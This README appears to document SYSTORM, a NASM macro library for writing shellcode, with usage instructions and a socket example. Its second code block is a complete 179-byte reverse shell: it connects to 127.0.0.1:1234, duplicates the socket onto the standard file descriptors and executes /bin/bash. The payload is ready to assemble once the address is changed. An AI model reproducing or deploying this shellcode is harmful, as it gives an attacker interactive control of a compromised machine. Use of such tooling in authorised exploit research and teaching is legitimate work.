# SYSTORM
NASM Standard Library for shellcode
---
https://scorchsecurity.wordpress.com/2016/07/31/nasm-and-friends/

##Usage:
To use functions defined within the .inc files, you have to include that file: `%include "syscall.inc"`
If using "thread.inc", "socket.inc", or "utils.inc", you have to include each function that you want to use.
For example: write `use.thread.create` to use thread.create.

A simple program is:
```
%include "syscall.inc"
; %include "thread.inc"
%include "socket.inc"
%include "utils.inc"

global _start
; _start goes first
_start:
    jmp main

; syscalls do not need to be included with 'use.*'
use.sock.socket
use.sock.connect

main:
	stackframe 4

	sock.socket AF_INET, SOCK_STREAM
	mov dword [ebp-4], eax
	sock.connect dword [ebp-4], AF_INET, 0x0101017F, 0xD204	; 127.0.0.1, 1234

	inline 'Hello!', 0xa			; places addr of 'Hello!\n' into eax
	
	sys.write dword [ebp-4], eax, 7	; write 'Hello!\n' to sockfd
	sys.close dword [ebp-4]			; close sockfd
	
	leave
	sys.exit 0
```
As is evident, systorm defines a number of macros that can be used to perform useful operations, like including inline data and setting up stackframes.

Additionally, all syscalls (prefixed with "sys.") are set up as macros, so they do not need to be included like other functions.

A simple reverse shell (179 bytes) is:
```
%include "syscall.inc"
%include "socket.inc"
%include "utils.inc"

global _start
_start:
    jmp main

use.sock.socket
use.sock.connect

main:
    stackframe 4

    sock.socket AF_INET, SOCK_STREAM
    mov dword [ebp-4], eax
    sock.connect dword [ebp-4], AF_INET, dword 0x0101017F, 0xD204	; 127.0.0.1, 1234s
    mov ecx, 2
.dup_loop:
    sys.dup2 [ebp-4], ecx
    dec ecx
    jns .dup_loop
exec:
    inline '/bin/bash', 0
    sys.execve eax, 0, 0
    sys.exit 0
```
